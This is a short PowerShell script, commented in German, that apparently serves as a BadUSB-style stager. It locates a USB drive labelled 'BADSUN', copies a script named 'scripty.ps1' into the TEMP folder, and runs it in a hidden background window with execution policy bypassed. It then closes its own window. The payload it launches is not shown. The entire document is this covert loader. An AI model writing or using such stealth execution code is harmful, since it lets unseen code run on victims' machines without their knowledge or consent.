# Funktion zum Ermitteln des USB-Laufwerksbuchstabens mit dem Namen "BADSUN"
function Get-USBDriveLetter {
    $usbDrive = Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='BADSUN'" | Select-Object -First 1
    return $usbDrive.DriveLetter
}

# USB-Laufwerksbuchstaben ermitteln
$usbDriveLetter = Get-USBDriveLetter

if ($usbDriveLetter) {
    # Pfad zur Datei scripty.ps1 auf dem USB-Laufwerk
    $usbScriptPath = Join-Path -Path $usbDriveLetter -ChildPath "scripty.ps1"
    
    # Pfad zum temporären Ordner
    $tempScriptPath = Join-Path -Path $env:TEMP -ChildPath "scripty.ps1"

    # Datei scripty.ps1 in den temporären Ordner kopieren
    Copy-Item -Path $usbScriptPath -Destination $tempScriptPath -Force

    # Skript im Hintergrund ausführen
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScriptPath`"" -WindowStyle Hidden

    # Ursprüngliches PowerShell-Fenster schließen
    Stop-Process -Id $PID
} else {
    Write-Host "USB-Laufwerk mit dem Namen 'BADSUN' wurde nicht gefunden."
}
